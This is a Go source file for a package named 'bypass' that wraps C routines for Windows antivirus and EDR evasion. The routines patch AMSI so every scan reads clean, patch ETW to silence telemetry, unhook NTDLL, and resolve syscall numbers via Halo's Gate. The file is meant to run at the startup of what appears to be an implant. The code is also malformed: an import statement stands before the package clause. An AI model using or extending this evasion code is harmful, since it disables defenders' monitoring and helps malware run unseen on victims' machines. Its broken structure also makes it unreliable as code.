//go:build windows

// Package bypass provides Windows AV/EDR bypass: AMSI patch, ETW patch,
// NTDLL unhooking, and PE header stomping.
import "unsafe"
// All techniques are well-documented in public security research.
package bypass

/*
#cgo CFLAGS: -O2 -masm=intel
#include "bypass_windows.c"
#include <stdlib.h>
*/
import "C"
import "fmt"

// Result bitmask values
const (
	ResultAMSI    = 0x01
	ResultETW     = 0x02
	ResultUnhook  = 0x04
)

// HardenResult describes which bypass techniques succeeded.
type HardenResult struct {
	AMSIPatched    bool
	ETWPatched     bool
	NTDLLUnhooked  bool
	Raw            int
}

func (r HardenResult) String() string {
	return fmt.Sprintf("AMSI=%v ETW=%v Unhook=%v",
		r.AMSIPatched, r.ETWPatched, r.NTDLLUnhooked)
}

// Harden applies all bypass techniques and returns what succeeded.
// Safe to call even if AMSI/ETW are not present (gracefully skips).
// Should be called once at startup before any capability execution.
func Harden() HardenResult {
	raw := int(C.silentium_harden())
	return HardenResult{
		AMSIPatched:   raw&ResultAMSI != 0,
		ETWPatched:    raw&ResultETW  != 0,
		NTDLLUnhooked: raw&ResultUnhook != 0,
		Raw:           raw,
	}
}

// PatchAMSI patches AmsiScanBuffer to return clean for all scans.
func PatchAMSI() error {
	if rc := C.silentium_patch_amsi(); rc != 0 {
		return fmt.Errorf("amsi patch failed: %d", rc)
	}
	return nil
}

// PatchETW patches EtwEventWrite to suppress process telemetry.
func PatchETW() error {
	if rc := C.silentium_patch_etw(); rc != 0 {
		return fmt.Errorf("etw patch failed: %d", rc)
	}
	return nil
}

// UnhookNTDLL restores the original NTDLL .text section from disk,
// removing any EDR hooks installed in memory.
func UnhookNTDLL() (int, error) {
	restored := int(C.silentium_unhook_ntdll())
	if restored < 0 {
		return 0, fmt.Errorf("ntdll unhook failed")
	}
	return restored, nil
}

// GetSSN returns the syscall service number for an NT function.
// Uses Halo's Gate to handle hooked stubs.
func GetSSN(funcName string) (uint32, error) {
	cName := C.CString(funcName)
	defer C.free(unsafe.Pointer(cName))
	ssn := uint32(C.silentium_get_ssn(cName))
	if ssn == 0xFFFFFFFF {
		return 0, fmt.Errorf("could not resolve SSN for %s", funcName)
	}
	return ssn, nil
}
